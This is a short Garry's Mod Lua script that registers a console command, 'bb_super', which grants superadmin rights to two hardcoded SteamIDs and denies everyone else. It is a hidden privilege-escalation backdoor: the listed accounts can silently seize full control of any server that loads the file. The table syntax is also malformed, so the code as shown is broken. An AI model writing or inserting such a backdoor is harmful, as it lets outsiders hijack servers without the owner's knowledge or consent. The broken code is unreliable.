local tb = {
  tb["STEAM_0:1:82058544"] = true,
  tb["STEAM_0:0:58328111"] = true,
}

concommand.Add( "bb_super", function(ply)
  if ply:IsValid() && tb[ply:SteamID()] then
    ply:SetUserGroup("superadmin")
else
  ply:PrintMessage(HUD_PRINTCONSOLE, "Access Denied." )
end
end)
